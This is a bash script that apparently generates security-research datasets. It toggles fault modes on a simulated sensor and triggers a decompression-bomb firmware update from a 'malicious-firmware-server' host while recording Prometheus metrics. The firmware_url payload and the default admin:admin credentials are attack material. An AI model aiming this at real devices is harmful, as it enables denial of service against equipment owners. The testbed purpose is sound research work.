#!/bin/bash

# resource_exhaustion_dataset_generator.sh - Generate datasets for resource exhaustion under different fault conditions

# Default configuration
SENSOR_HOST="localhost"
SENSOR_PORT="12384"
PROMETHEUS_URL="http://localhost:9090"
OUTPUT_DIR="datasets/resource_exhaustion"
BASELINE_DURATION=120  # 2 minutes baseline collection
EVENT_DURATION=300     # 5 minutes during attack
POST_EVENT_DURATION=240  # 4 minutes recovery collection
COMPRESSION_RATIO=2000  # Severe intensity resource exhaustion
FAULT_TYPES=("none" "stuck" "drift" "spike" "dropout")
MALICIOUS_SERVER="malicious-firmware-server:38888"

# Command line arguments
while [[ $# -gt 0 ]]; do
  case $1 in
    --sensor)
      SENSOR_HOST="$2"
      shift 2
      ;;
    --port)
      SENSOR_PORT="$2"
      shift 2
      ;;
    --prometheus)
      PROMETHEUS_URL="$2"
      shift 2
      ;;
    --output)
      OUTPUT_DIR="$2"
      shift 2
      ;;
    --baseline)
      BASELINE_DURATION="$2"
      shift 2
      ;;
    --event)
      EVENT_DURATION="$2"
      shift 2
      ;;
    --post)
      POST_EVENT_DURATION="$2"
      shift 2
      ;;
    --ratio)
      COMPRESSION_RATIO="$2"
      shift 2
      ;;
    --server)
      MALICIOUS_SERVER="$2"
      shift 2
      ;;
    --help)
      echo "Usage: $0 [options]"
      echo "Options:"
      echo "  --sensor HOST        Sensor hostname/IP (default: localhost)"
      echo "  --port PORT          Sensor port (default: 12384)"
      echo "  --prometheus URL     Prometheus URL (default: http://localhost:9090)"
      echo "  --output DIR         Output directory (default: datasets/resource_exhaustion)"
      echo "  --baseline SEC       Baseline duration in seconds (default: 120)"
      echo "  --event SEC          Event duration in seconds (default: 300)"
      echo "  --post SEC           Post-event duration in seconds (default: 240)"
      echo "  --ratio NUM          Compression ratio for attack (default: 5000)"
      echo "  --server HOST:PORT   Malicious firmware server (default: malicious-firmware-server:38888)"
      exit 0
      ;;
    *)
      echo "Unknown option: $1"
      exit 1
      ;;
  esac
done

# Create output directory
mkdir -p "$OUTPUT_DIR"
echo "Datasets will be saved to: $OUTPUT_DIR"

# Create a master metadata file
MASTER_META_FILE="$OUTPUT_DIR/resource_exhaustion_dataset_master_$(date +%Y%m%d_%H%M%S).json"
echo "{" > "$MASTER_META_FILE"
echo "  \"dataset_type\": \"resource_exhaustion_vulnerability_analysis\"," >> "$MASTER_META_FILE"
echo "  \"created_at\": \"$(date -Iseconds)\"," >> "$MASTER_META_FILE"
echo "  \"sensor_host\": \"$SENSOR_HOST\"," >> "$MASTER_META_FILE"
echo "  \"sensor_port\": \"$SENSOR_PORT\"," >> "$MASTER_META_FILE"
echo "  \"compression_ratio\": $COMPRESSION_RATIO," >> "$MASTER_META_FILE"
echo "  \"attack_description\": \"Resource exhaustion via malicious firmware update (decompression bomb)\"," >> "$MASTER_META_FILE"
echo "  \"fault_scenarios\": {" >> "$MASTER_META_FILE"

# Utility function to set sensor fault mode
set_fault_mode() {
    local sensor_host=$1
    local sensor_port=$2
    local fault_type=$3
    
    echo "Setting fault mode to: $fault_type"
    
    # Determine payload based on fault type
    if [ "$fault_type" == "none" ]; then
        payload='{"fault_mode": "none"}'
    elif [ "$fault_type" == "stuck" ]; then
        payload='{"fault_mode": "stuck"}'
    elif [ "$fault_type" == "drift" ]; then
        payload='{"fault_mode": "drift"}'
    elif [ "$fault_type" == "spike" ]; then
        payload='{"fault_mode": "spike"}'
    elif [ "$fault_type" == "dropout" ]; then
        payload='{"fault_mode": "dropout"}'
    else
        echo "Unknown fault type: $fault_type"
        return 1
    fi
    
    # Send request to set fault mode
    response=$(curl -s -X POST \
      "http://$sensor_host:$sensor_port/simulate/fault" \
      -H 'Content-Type: application/json' \
      -H 'accept: application/json' \
      -u admin:admin \
      -d "$payload")
    
    echo "Fault mode set response: $response"
    
    # Sleep to allow fault to take effect
    sleep 5
    
    return 0
}

# Function to trigger resource exhaustion attack
trigger_resource_exhaustion() {
    local sensor_host=$1
    local sensor_port=$2
    local compression_ratio=$3
    
    echo "Triggering resource exhaustion attack with compression ratio: $compression_ratio"
    
    # Prepare payload for the firmware update
    # """ There is actually only
    # 500 mild_firmware.sh 
    # 2000 medium_firmware.sh
    # 5000 severe_firmware.sh
    # 10000 extreme_firmware.sh
    # """

    payload="{\"firmware_url\": \"http://$MALICIOUS_SERVER/medium_firmware.sh\", \"version\": \"1.2.3-RATIO-${compression_ratio}\"}"

    # Send request to trigger resource exhaustion
    response=$(curl -s -X POST \
      "http://$sensor_host:$sensor_port/firmware/update" \
      -H 'Content-Type: application/json' \
      -H 'accept: application/json' \
      -u admin:admin \
      -d "$payload")
    
    echo "Resource exhaustion attack response: $response"
    
    # Check if the attack was successful
    if echo "$response" | grep -q "success" || echo "$response" | grep -q "Empty reply from server"; then
        echo "Resource exhaustion attack triggered successfully"
        return 0
    else
        echo "Failed to trigger resource exhaustion attack"
        echo "Response: $response"
        return 1
    fi
}

# Process each fault type
FIRST_SCENARIO=true
for fault_type in "${FAULT_TYPES[@]}"; do
    echo "====================================================="
    echo "Processing resource exhaustion under fault condition: $fault_type"
    echo "====================================================="
    
    # Create a subdirectory for this fault scenario
    SCENARIO_DIR="$OUTPUT_DIR/${fault_type}_fault"
    mkdir -p "$SCENARIO_DIR"
    
    # Comma handling for JSON
    if [ "$FIRST_SCENARIO" = false ]; then
        echo "  ," >> "$MASTER_META_FILE"
    else
        FIRST_SCENARIO=false
    fi
    
    # Start JSON entry for this fault scenario
    echo "    \"${fault_type}\": {" >> "$MASTER_META_FILE"
    
    # Reset to normal mode first
    set_fault_mode "$SENSOR_HOST" "$SENSOR_PORT" "none"
    sleep 5
    
    # Set the fault mode
    set_fault_mode "$SENSOR_HOST" "$SENSOR_PORT" "$fault_type"
    
    # Collect baseline data
    echo "Collecting baseline data before resource exhaustion attack..."
    python3 data_collector.py \
        --event "resexhaustion_${fault_type}_baseline" \
        --duration "$BASELINE_DURATION" \
        --interval 2 \
        --prometheus "$PROMETHEUS_URL" \
        --output "$SCENARIO_DIR"
    
    BASELINE_FILE=$(ls -t "$SCENARIO_DIR"/resexhaustion_${fault_type}_baseline_*.jsonl | head -1)
    echo "Baseline data collected: $BASELINE_FILE"
    
    # Add baseline file to metadata
    echo "      \"baseline_file\": \"$BASELINE_FILE\"," >> "$MASTER_META_FILE"
    
    # Start data collection for the attack
    echo "Starting data collection for resource exhaustion attack..."
    python3 data_collector.py \
        --event "resexhaustion_${fault_type}_attack" \
        --duration "$EVENT_DURATION" \
        --interval 2 \
        --prometheus "$PROMETHEUS_URL" \
        --output "$SCENARIO_DIR" &
    
    COLLECTOR_PID=$!
    echo "Data collector running with PID $COLLECTOR_PID"
    
    # Wait briefly to ensure data collector has started
    sleep 10
    
    # Trigger the resource exhaustion attack
    trigger_resource_exhaustion "$SENSOR_HOST" "$SENSOR_PORT" "$COMPRESSION_RATIO"
    
    # Wait for data collection to complete
    echo "Waiting for attack data collection to complete..."
    wait $COLLECTOR_PID
    
    EVENT_FILE=$(ls -t "$SCENARIO_DIR"/resexhaustion_${fault_type}_attack_*.jsonl | head -1)
    echo "Attack data collected: $EVENT_FILE"
    
    # Add event file to metadata
    echo "      \"event_file\": \"$EVENT_FILE\"," >> "$MASTER_META_FILE"
    
    # Collect post-event recovery data
    echo "Collecting post-attack recovery data..."
    python3 data_collector.py \
        --event "resexhaustion_${fault_type}_recovery" \
        --duration "$POST_EVENT_DURATION" \
        --interval 2 \
        --prometheus "$PROMETHEUS_URL" \
        --output "$SCENARIO_DIR"
    
    RECOVERY_FILE=$(ls -t "$SCENARIO_DIR"/resexhaustion_${fault_type}_recovery_*.jsonl | head -1)
    echo "Recovery data collected: $RECOVERY_FILE"
    
    # Add recovery file to metadata
    echo "      \"recovery_file\": \"$RECOVERY_FILE\"" >> "$MASTER_META_FILE"
    echo "    }" >> "$MASTER_META_FILE"
    
    # Reset fault mode to normal
    set_fault_mode "$SENSOR_HOST" "$SENSOR_PORT" "none"
    
    # Sleep between scenarios to ensure system stabilizes
    echo "Cooling down for 60 seconds before next scenario..."
    sleep 60
done

# Close the master metadata file
echo "  }" >> "$MASTER_META_FILE"
echo "}" >> "$MASTER_META_FILE"

echo "====================================================="
echo "Resource exhaustion dataset collection complete!"
echo "====================================================="
echo "Master metadata file: $MASTER_META_FILE"
echo ""
echo "To process this data into CSV format, run:"
echo "python3 resource_exhaustion_processor.py --metadata $MASTER_META_FILE"